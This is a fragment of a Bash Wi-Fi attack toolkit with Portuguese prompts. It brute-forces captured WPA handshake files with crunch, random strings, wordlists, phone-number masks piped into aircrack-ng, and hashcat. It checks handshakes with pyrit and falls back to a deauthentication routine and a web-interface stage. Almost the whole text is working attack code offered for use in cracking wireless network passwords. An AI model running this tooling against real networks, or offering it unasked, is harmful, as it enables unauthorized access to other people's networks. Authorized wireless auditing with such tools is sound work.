################################### < BRUTEFORCE > ###################################
function Bruteforce() {
    clear; top
    echo; echo "*** Método de Ataque ***"
    echo "1) Crunch       - Senhas sequenciais"
    echo "2) RandomGen    - Senhas aleatórias"
    echo "3) Dicionário   - Wordlist"
    echo "4) Telefone     - Números de telefone"
    echo "5) Hashcat      - Máscara (requer .hccapx)"
    echo -n "#> "
    read -r a

    case $a in
        1|2|3|4)
            echo "Onde está o arquivo .cap? (ex: /root/handshakes/)"
            read -r CAPLOCATION
            cd "$CAPLOCATION" || return
            ls
            echo "Nome do arquivo .cap:"
            read -r CAPNAME
            ;;
    esac

    case $a in
        1)
            echo "BSSID da rede:"; read -r BSSID
            echo "Tamanho mínimo:"; read -r MIN
            echo "Tamanho máximo:"; read -r MAX
            echo "Charset (ex: 0123456789):"; read -r CHARSET
            crunch "$MIN" "$MAX" "$CHARSET" | aircrack-ng --bssid "$BSSID" -w- "${CAPLOCATION}${CAPNAME}"
            ;;
        2)
            echo "BSSID:"; read -r BSSID
            echo "Tamanho:"; read -r MAX
            echo "Charset:"; read -r CHARSET
            cat /dev/urandom | tr -dc "$CHARSET" | fold -w "$MAX" | aircrack-ng --bssid "$BSSID" -w- "${CAPLOCATION}${CAPNAME}"
            ;;
        3)
            echo "Local do dicionário:"; read -r DICTLOCATION
            echo "Nome do dicionário:"; read -r DICTNAME
            aircrack-ng "${CAPLOCATION}${CAPNAME}" -w "${DICTLOCATION}${DICTNAME}"
            ;;
        4)
            echo "BSSID:"; read -r BSSID
            echo "DDD/Código de área:"; read -r AREACODE
            echo "[1](555)555-5555 [2]555-555-5555 [3]5555555555 [4]555-5555 [5]5555555"
            read -r fmt
            case $fmt in
                1) crunch 13 13 -t "\\($AREACODE\\)%%%\\-%%%%"  | aircrack-ng --bssid "$BSSID" -w- "${CAPLOCATION}${CAPNAME}" ;;
                2) crunch 12 12 -t "$AREACODE\\-%%%\\-%%%%"      | aircrack-ng --bssid "$BSSID" -w- "${CAPLOCATION}${CAPNAME}" ;;
                3) crunch 10 10 -t "${AREACODE}%%%%%%%"          | aircrack-ng --bssid "$BSSID" -w- "${CAPLOCATION}${CAPNAME}" ;;
                4) crunch  8  8 -t "%%%\\-%%%%"                  | aircrack-ng --bssid "$BSSID" -w- "${CAPLOCATION}${CAPNAME}" ;;
                5) crunch  7  7 -t "%%%%%%%"                     | aircrack-ng --bssid "$BSSID" -w- "${CAPLOCATION}${CAPNAME}" ;;
            esac
            ;;
        5)
            # Parrot OS 7: hccapx (hashcat ≥ 6 usa .hc22000 via hcxtools)
            echo "Arquivo .cap:"; read -r CAPNAME; read -r CAPLOCATION
            echo "Convertendo para .hc22000 (requer hcxtools)..."
            if command -v hcxpcapngtool &>/dev/null; then
                hcxpcapngtool -o "${CAPLOCATION}${CAPNAME}.hc22000" "${CAPLOCATION}${CAPNAME}"
                echo "Máscara (ex: ?d?d?d?d?d?d?d?d):"; read -r MASK
                hashcat -m 22000 -a 3 "${CAPLOCATION}${CAPNAME}.hc22000" "$MASK"
            else
                echo "hcxtools não encontrado. Instale: apt install hcxtools"
            fi
            ;;
    esac
}

function Bruteforce2() {
    BSSID="$Host_MAC"
    CAPNAME="$Host_SSID-$Host_MAC.cap"
    Bruteforce
}

################################### < HANDSHAKE > ###################################
function handshakelocation() {
    conditional_clear; top; infoap

    local saved_hs="/root/handshakes/${Host_SSID2}-${Host_MAC}.cap"
    if [ -f "$saved_hs" ]; then
        echo -e "Handshake encontrado: ${yellow}${saved_hs}${transparent}"
        echo -e "${red}Deseja usá-lo? [s/n]${transparent}"
        read -r usehandshakefile
        [ "$usehandshakefile" = "s" ] || [ -z "$usehandshakefile" ] && handshakeloc="$saved_hs"
    fi

    if [ -z "$handshakeloc" ]; then
        echo; echo -e "Caminho do handshake (Enter para capturar agora):"
        echo -n "Path: "; echo -ne "$red"
        read -r handshakeloc; echo -ne "$transparent"
    fi

    if [ -z "$handshakeloc" ]; then
        deauthforce
    else
        if [ -f "$handshakeloc" ]; then
            Host_SSID_loc=$(pyrit -r "$handshakeloc" analyze 2>&1 | grep "^#" | cut -d "(" -f2 | cut -d "'" -f2)
            Host_MAC_loc=$(pyrit -r "$handshakeloc" analyze 2>&1 | grep "^#" | cut -d " " -f3 | tr '[:lower:]' '[:upper:]')
            if [[ "$Host_MAC_loc" == *"$Host_MAC"* ]] && [[ "$Host_SSID_loc" == *"$Host_SSID"* ]]; then
                if aircrack-ng "$handshakeloc" | grep -q "1 handshake"; then
                    cp "$handshakeloc" "$DUMP_PATH/$Host_MAC-01.cap"
                    webinterface
                else
                    echo -e "${yellow}Handshake corrompido.${transparent}"
                    echo "Tentar com pyrit? [s/Enter=não]"; read -r resp
                    if [ -n "$resp" ]; then
                        if pyrit -r "$handshakeloc" analyze 2>&1 | grep -qi "good,"; then
                            cp "$handshakeloc" "$DUMP_PATH/$Host_MAC-01.cap"; webinterface
                        else echo "Corrompido."; sleep 2; handshakelocation; fi
                    else handshakelocation; fi
                fi
            else
                echo -e "${red}MAC/SSID não correspondem.${transparent}"; sleep 4; handshakelocation
            fi
        else
            echo "Arquivo não encontrado."; sleep 2; handshakelocation
        fi
    fi
}

